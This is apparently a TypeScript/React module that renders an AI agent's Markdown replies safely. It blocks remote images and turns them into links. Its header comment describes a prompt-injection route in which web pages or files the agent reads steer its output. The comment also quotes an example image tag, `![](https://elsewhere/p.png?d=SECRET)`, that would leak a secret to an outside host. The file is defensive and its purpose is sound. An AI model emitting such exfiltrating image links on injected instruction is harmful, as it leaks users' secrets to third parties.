import { createElement, type ComponentProps } from 'react';
import type { Components } from 'react-markdown';

/** What the agent writes is shown as Markdown, and the agent reads web pages and files that may tell it what to write. So nothing
 * in a reply is fetched from elsewhere: an image is drawn only when it is one of the profile's own (`/images/<profile>/<name>`) or
 * a picture on this machine by its absolute path (`/tmp/chart.png`), which this server serves the page alone (`picture` in
 * server/files.ts), and any other is shown as a link, which goes nowhere until it is clicked.
 * `![](https://elsewhere/p.png?d=SECRET)` would otherwise hand whatever is in its address to that server the moment the reply is
 * drawn. Links open in a new tab that knows nothing of this one; react-markdown itself drops addresses that run script. */
const PROFILE_IMAGE = /^\/images\/[^/]+\/[0-9a-f]{16}$/, PICTURE = /^\/(?!\/)[^?#]*\.(?:png|jpe?g|gif|webp)$/i;
/** The socket's token, from the address that opened the page, after its #: a picture on this machine is served only with it. */
export const token = typeof location === 'undefined' ? '' : location.hash.slice(1);
/** The path an image's address names: `%23` is a `#` in the file's name. As written when it is not a valid address. */
export const pathOf = (src: string) => { try { return decodeURIComponent(src); } catch { return src; } };
/** Where the page gets an image a reply names, when it may draw it at all. */
export function shown(src: unknown) {
  if (typeof src !== 'string') return undefined;
  if (PROFILE_IMAGE.test(src)) return src;
  return PICTURE.test(src) ? `/file?${new URLSearchParams({ path: pathOf(src), token })}` : undefined;
}
export const link = (props: ComponentProps<'a'>) => createElement('a', { ...props, target: '_blank', rel: 'noreferrer noopener' });
export const safe = {
  a: ({ node: _, ...props }) => link(props),
  img: ({ node: _, src, alt, title }) => { const at = shown(src); return at ? createElement('img', { src: at, alt, title }) : link({ href: src, title, children: alt || src }); },
} satisfies Components;
